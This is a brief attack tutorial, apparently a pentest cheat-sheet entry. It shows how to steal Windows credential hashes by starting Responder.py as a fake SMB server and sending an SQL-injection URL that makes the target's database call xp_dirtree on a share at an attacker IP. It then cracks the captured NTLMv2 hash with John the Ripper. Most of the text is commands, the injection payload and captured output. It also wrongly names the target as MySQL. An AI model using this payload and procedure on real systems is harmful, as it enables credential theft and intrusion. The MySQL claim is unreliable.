# xp_dirtree and Responder.py
We can use Responder.py to act as a fake SMB service which will accept connections and store the user's hash for us to crack using John the Ripper.

First we need to start Responder,
```
root@attacker-machine:~# python Responder.py
...(SNIPPED) ...
[+] Listening for events...
```
Next, we perfom a simple `EXEC` command with `xp_dirtree` using SQL Injection fo a MySQL service like so,
```
https://(TARGET IP ADDRESS)/path/to/Some.aspx?ParamId=0%20EXEC%20master..xp_dirtree%20%27\\(ATTACKER IP ADDRESS)\foo%27%20--
```
And we will get the hash for the user passed to Responder.py
```
[SMB] NTLMv2-SSP Client   : (TARGET IP ADDRESS)
[SMB] NTLMv2-SSP Username : (TARGET DOMAIN)\(TARGET USER)
[SMB] NTLMv2-SSP Hash     : (TARGET USER)::(TARGET DOMAIN):1122334455667788:EA0...
...(SNIPPED)...
[SMB] Requested Share     : \\(ATTACKER IP)\IPC$
[*] Skipping previously captured hash for GIDDY\Stacy
[SMB] Requested Share     : \\(ATTACKER IP)\FOO
```
Copy the NTLMv2-SSP Hash string starting with the target user and save to a file.

Then, simply use John the Ripper to crack the hash.
